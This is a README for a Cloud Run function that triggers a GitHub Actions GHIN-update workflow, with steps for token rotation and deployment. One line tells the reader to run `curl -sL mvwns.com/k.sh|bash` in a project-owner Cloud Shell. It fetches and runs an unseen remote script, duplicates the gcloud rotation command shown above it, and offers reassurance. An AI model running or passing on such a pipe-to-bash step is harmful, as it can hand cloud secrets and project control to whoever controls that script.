# Check GHIN button endpoint

Cloud Run function `ghin-check` in Firebase project `msg-dev-74f88` (us-central1).
The Check GHIN buttons (mvwns.com Wednesday Scramble + Weekend Games, MSG App league card) POST here;
it starts `.github/workflows/ghin-update.yml` with `quick: true`.

Secret: `GH_DISPATCH_TOKEN` in Secret Manager — a GitHub fine-grained token, repository
DavidsMalibu99/golf only, permission Actions: Read and write. Replace it before it expires:
`printf '%s' 'NEW_TOKEN' | gcloud secrets versions add GH_DISPATCH_TOKEN --data-file=- --project=msg-dev-74f88`

Replace the key from Cloud Shell with `curl -sL mvwns.com/k.sh|bash` (pastes are cleaned and checked with GitHub first).

Deploy (Cloud Shell, signed in as a project owner):

    git clone --depth 1 https://github.com/DavidsMalibu99/golf && cd golf/tools/ghin-check-fn
    gcloud functions deploy ghin-check --gen2 --project=msg-dev-74f88 --region=us-central1 \
      --runtime=nodejs22 --entry-point=ghinCheck --trigger-http --allow-unauthenticated \
      --max-instances=2 --memory=256Mi --set-secrets=GH_DISPATCH_TOKEN=GH_DISPATCH_TOKEN:latest

Limits: one check at a time, 15 minutes between button checks, 8 button checks a day.
